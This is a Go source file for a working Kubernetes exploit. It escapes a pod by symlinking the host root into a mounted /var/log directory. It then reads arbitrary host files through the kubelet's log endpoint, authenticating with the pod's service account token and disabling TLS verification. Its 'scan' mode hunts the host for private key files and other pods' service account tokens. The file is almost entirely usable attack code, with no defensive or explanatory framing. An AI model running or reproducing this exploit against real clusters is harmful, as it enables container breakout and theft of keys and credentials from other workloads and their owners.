package main

import (
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"regexp"
	"strings"
	"time"
)

const (
	c_PathSecrets  = "/var/run/secrets/kubernetes.io/serviceaccount/token"
	c_DownloadPath = "/exploit/host-data"
)

var (
	g_Bearer, g_DefaultGet                              string
	g_CountScan, g_CountFileExists, g_LastStatusRespond int
	g_Client                                            *http.Client
)

func checkError(i_Error error) {
	if i_Error != nil {
		log.Fatal(i_Error)
	}
}

func initVariables() {
	defaultGetTemp := getDefaultGateway()
	g_DefaultGet = defaultGetTemp

	data, err := ioutil.ReadFile(c_PathSecrets)
	checkError(err)

	token := string(data)
	bearerTemp := "Bearer " + token
	g_Bearer = bearerTemp

	tr := &http.Transport{
		MaxIdleConns:       10,
		IdleConnTimeout:    30 * time.Second,
		DisableCompression: true,
		TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
	}
	g_Client = &http.Client{
		Transport: tr,
		Timeout:   time.Second * 20,
	}
}

func getMountPathIfExists() string {
	cmd := `cat /proc/self/mountinfo | grep /var/log || true`
	out, err := exec.Command("sh", "-c", cmd).Output()
	checkError(err)
	pattern := ".*? .*? .*? (.*?) (.*?) .*?\n"
	r, err := regexp.Compile(pattern)
	checkError(err)
	match := r.FindAllStringSubmatch(string(out), -1)
	for _, matchInner := range match {
		if matchInner[1] == "/var/log" {
			return matchInner[2]
		}
	}
	return ""
}

func getDefaultGateway() string {
	cmd := `cat  /proc/net/route`
	out, err := exec.Command("sh", "-c", cmd).Output()

	pattern := `\n[^[:space:]]*?[[:space:]]00000000[[:space:]](.*?)[[:space:]]`
	r, err := regexp.Compile(pattern)
	checkError(err)
	match := r.FindAllStringSubmatch(string(out), -1)

	gateway := match[0][1]
	a, _ := hex.DecodeString(gateway)
	return fmt.Sprintf("%v.%v.%v.%v", a[3], a[2], a[1], a[0])
}

func writeToScanFile(i_DirPath string, i_ContentToWrite string) {
	f, err := os.OpenFile(i_DirPath, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
	checkError(err)
	defer f.Close()

	_, err = f.WriteString(i_ContentToWrite)
	checkError(err)
}

func read(i_Path string) string {
	req, _ := http.NewRequest("GET", fmt.Sprintf("https://%s:10250/logs/root_link%s", g_DefaultGet, i_Path), nil)
	req.Header.Add("Authorization", g_Bearer)
	resp, err := g_Client.Do(req)
	checkError(err)

	tempStatus := resp.StatusCode
	g_LastStatusRespond = tempStatus

	if resp.StatusCode != 200 && resp.StatusCode != 404 {
		log.Fatalf("[!] Cannot run exploit, no permissions to access logs on the kubelet\n")
	}

	if resp.StatusCode == 404 {
		return fmt.Sprintf("[!] The path %s does not exists in the host\n", i_Path)
	}

	body, err := ioutil.ReadAll(resp.Body)
	checkError(err)

	defer resp.Body.Close()
	return string(body)
}

func readDirAndFilter(i_Path string) (string, []string) {
	directoryPattern := "<a href=\"(.*)\""
	r, err := regexp.Compile(directoryPattern)
	checkError(err)

	pathContent := read(i_Path)
	matches := r.FindAllStringSubmatch(pathContent, -1)
	pathContentFiltered := make([]string, len(matches))

	for i, match := range matches {
		pathContentFiltered[i] = match[1]
	}

	return pathContent, pathContentFiltered
}

func mkdirAndDownload(i_Path string, i_Query string, i_FileName string) {
	filePath := filepath.Join(c_DownloadPath, i_FileName)
	g_CountScan = 0
	if _, err := os.Stat(c_DownloadPath); os.IsNotExist(err) {
		err = os.MkdirAll(c_DownloadPath, os.FileMode(0766))
		checkError(err)
		fmt.Printf("[i] created dir in: %s \n", c_DownloadPath)
	}
	downloadByQuery(i_Path, i_Query, filePath)
	fmt.Printf("[+] found %d %s in %s\n", g_CountScan, i_FileName, i_Path)
	g_CountScan = 0
}

func query(i_Query string, i_Content string, i_FullPath string) bool {
	var match bool
	match, err := filepath.Match(i_Query, i_Content)
	checkError(err)

	if match == false {
		return match
	}
	//for duplicate tokens
	if i_Query == "token" && match == true {
		pattern := `.*\.\.\d+_\d+_\d+_\d+_\d+_\d+\.\d+\/token`
		r, err := regexp.Compile(pattern)
		checkError(err)
		match = !r.MatchString(i_FullPath)
	}

	return match
}

func downloadByQuery(i_Path string, i_Query string, i_FilePath string) {
	excludedFolders := "proc/"
	var currPath string

	_, pathContentFiltered := readDirAndFilter(i_Path)
	for _, dirContent := range pathContentFiltered {

		if dirContent == excludedFolders {
			continue
		}

		currPath = filepath.Join(i_Path, dirContent)

		if strings.HasSuffix(dirContent, "/") {
			downloadByQuery(currPath, i_Query, i_FilePath)
			continue
		}
		match := query(i_Query, dirContent, currPath)
		if match {
			currPath = fmt.Sprintf("%s\n\n", currPath)
			writeToScanFile(i_FilePath, currPath)
			g_CountScan++
		}
	}
}

func lsh(i_Path string) string {
	pathContent, pathContentFiltered := readDirAndFilter(i_Path)
	var allDir string

	if g_LastStatusRespond == 404 {
		return pathContent
	}

	if len(pathContentFiltered) == 0 && len(pathContent) != 0 {
		return fmt.Sprintf("[!] %s is not a directory", i_Path)
	}

	for i, match := range pathContentFiltered {
		dir := strings.TrimSuffix(match, "/")
		if i == 0 {
			allDir = dir
		} else {
			allDir = fmt.Sprintf("%s\n%s", allDir, dir)
		}
	}

	return allDir
}

func cath(i_Path string) string {
	pathContent, pathContentFiltered := readDirAndFilter(i_Path)

	if 1 <= len(pathContentFiltered) {
		return fmt.Sprintf("[-] %s is a directory", i_Path)
	}

	return pathContent
}

func isRoot() bool {
	currentUser, err := user.Current()
	checkError(err)
	return currentUser.Username == "root"
}

func attachToRoot() string {
	path := getMountPathIfExists()
	if path == "" {
		return fmt.Sprintf("[!] No root mount to /var/log exists in the pod, cant continute to the exploit\n")
	}
	if isRoot() {
		if err := os.Symlink("/", fmt.Sprintf("%s%s", path, "/root_link")); err != nil {
			if os.IsExist(err) {
				fmt.Println("[i] Symlink aleardy exists , continue to the exploit")
				return ""
			}

			checkError(err)
		}
	} else {
		return fmt.Sprintf("[!] The process is not running as root, cant continute to the exploit\n")
	}

	fmt.Println("[i] Create symlink succeeded")
	return ""
}

func dettachFromRoot() {
	if _, err := os.Lstat("/var/log/host/root_link"); err == nil {
		err := os.Remove("/var/log/host/root_link")
		checkError(err)
	} else {
		if os.IsNotExist(err) {
			fmt.Println("[i] Symlink is not exists, ending exploit")
			return
		}

		checkError(err)
	}

	fmt.Printf("[i] Removed symlink succeeded\n")
}

func dirMessage(i_FileName string) {
	fmt.Printf("[i] The result of the scan is stored in a file at %s/%s in the agent. The file includes path for each corresponded match \n You can access the file through the bash module of the agent\n", c_DownloadPath, i_FileName)
}

func mainfunc(i_Command string, i_Option string) {
	msg := attachToRoot()
	if msg != "" {
		fmt.Print(msg)
		return
	}

	initVariables()
	g_CountFileExists = 0

	switch i_Command {
	case "lsh":
		fmt.Println(lsh(i_Option))
	case "cath":
		fmt.Println(cath(i_Option))
	case "scan":
		switch i_Option {
		case "key":
			mkdirAndDownload("/home/", "*.key", "private-keys")
			mkdirAndDownload("/etc/", "*.key", "private-keys")
			mkdirAndDownload("/var/lib/kubelet/pods/", "*.key", "private-keys")
			mkdirAndDownload("/var/lib/docker/", "*.key", "private-keys")
			mkdirAndDownload("/usr/", "*.key", "private-keys")
			dirMessage("private-keys")
		case "token":
			mkdirAndDownload("/var/lib/kubelet/pods/", "token", "tokens")
			dirMessage("tokens")
		default:
			usage()
		}
	default:
		usage()
	}

	dettachFromRoot()
}

func usage() {
	fmt.Println("[i] Usage: [cath|lsh] <host_path>")
	fmt.Println("[i] Usage: [scan] [token|key]")
}
